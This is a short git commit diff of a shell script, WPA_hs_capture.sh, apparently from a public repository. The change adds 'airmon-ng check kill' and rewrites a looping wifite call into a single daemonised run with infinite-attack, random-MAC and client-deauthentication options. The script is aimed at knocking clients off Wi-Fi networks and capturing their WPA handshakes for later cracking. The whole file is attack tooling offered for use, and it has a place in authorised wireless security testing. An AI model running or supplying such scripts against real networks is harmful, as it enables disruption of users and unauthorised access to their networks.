465c8091321b98786dc4024eb1325fed60973537
Sh7yk <93066307+Sh7yk@users.noreply.github.com>
2025-01-27 22:57:09 +0700

    Update WPA_hs_capture.sh

--- WPA_hs_capture.sh
+++ WPA_hs_capture.sh
@@ -4,12 +4,6 @@ if [ "$#" -ne 1 ]; then
 	echo "Usage $0 <interface>"
 	exit 1
 fi
-
+airmon-ng check kill
 INTERFACE=$1
-
-while (true)
-do
-killall wifite;
-wifite --kill -i $INTERFACE -p 8 --wpa --random-mac --skip-crack --clients-only --wpadt 2 --wpat 15 --no-pmkid --no-wps;
-sleep 1;
-done;
+wifite --kill -i $INTERFACE -inf -p 8 --wpa --random-mac --skip-crack --clients-only --wpadt 2 --wpat 15 --no-pmkid --no-wps --daemon -ic -pow 30;
